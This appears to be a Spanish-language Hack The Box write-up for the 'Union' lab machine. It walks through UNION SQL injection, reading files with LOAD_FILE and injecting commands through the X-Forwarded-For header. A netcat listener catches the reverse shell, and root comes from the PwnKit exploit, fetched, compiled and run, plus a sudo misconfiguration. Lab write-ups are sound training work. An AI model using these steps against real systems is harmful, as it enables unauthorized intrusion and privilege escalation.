---
layout: single
title: Union - Hack The Box
excerpt: "Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses."
date: 2025-06-19
classes: wide
header:
  teaser: /img2/union.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - SQLI (SQL Injection) - UNION Injection
  - SQLI - Read Files
  - HTTP Header Command Injection - X-FORWARDED-FOR [RCE]
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Abusing sudoers privilege [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.128
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 22:28 CEST
Nmap scan report for 10.10.11.128
Host is up (0.033s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
```

## Exploitation (OPTION 1)

- SQLI (UNION Injection)

![](/img2/Pasted%20image%2020250618223154.png)

![](/img2/Pasted%20image%2020250618223227.png)

> Vemos que dependiendo de si la query es exitosa sale un output u otro.

![](/img2/Pasted%20image%2020250618224209.png)

> De esta forma vemos la versión con la que estamos tratando.

![](/img2/Pasted%20image%2020250618224508.png)

> Vemos las bases de datos disponibles.

![](/img2/Pasted%20image%2020250618224627.png)

> Vemos las tablas disponibles en la base de datos "november".

![](/img2/Pasted%20image%2020250618225148.png)

> En la tabla flag se encuentra la credencial para poder inscribir un nuevo jugador.

![](/img2/Pasted%20image%2020250618225355.png)

![](/img2/Pasted%20image%2020250618225427.png)

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.128
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 22:56 CEST
Nmap scan report for 10.10.11.128
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
```

> Una vez registrado el nuevo jugador se nos abre el puerto ssh.

- SQLI (Read Files)

![](/img2/Pasted%20image%2020250618225808.png)

> Con la funcion LOAD_FILE podemos ver archivos internos del sistema.

![](/img2/Pasted%20image%2020250619105755.png)

> En el archivo de configuración encontramos las credenciales para conectarnos a la base de datos, podemos probar a conectarnos por ssh.

```bash
❯ ssh uhc@10.10.11.128
```

```ruby
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$
```

## Exploitation (OPTION 2)

- SQLI (Read Files)

![](/img2/Pasted%20image%2020250619113309.png)

> En vez de conectarnos por ssh, podemos leer el archivo firewall.php el cual contiene una vulnerabilidad RCE. El script guarda el contenido de la cabecera HTTP_X_FORWARDED_FOR en la variable $ip, en el caso de que no exista la cabecera se establece como variable $ip la dirección de la petición. Una vez obtenida la ip ejecuta el siguiente comando como usuario root:

```
sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT
```

-     HTTP Header Command Injection - X-FORWARDED-FOR (RCE)

![](/img2/Pasted%20image%2020250619114910.png)

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.128] 48272
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$     
```

## Post-exploitation (OPTION 1)

- Find SUID

```bash
uhc@union:/$ find / -perm -4000 2>/dev/null 
```

```ruby
/usr/bin/at
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Find sudoers

```bash
www-data@union:~/html$ sudo -l
```

```ruby
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
www-data@union:~/html$ sudo su
root@union:/var/www/html# 
```


![](/img2/Pasted%20image%2020250619110434.png)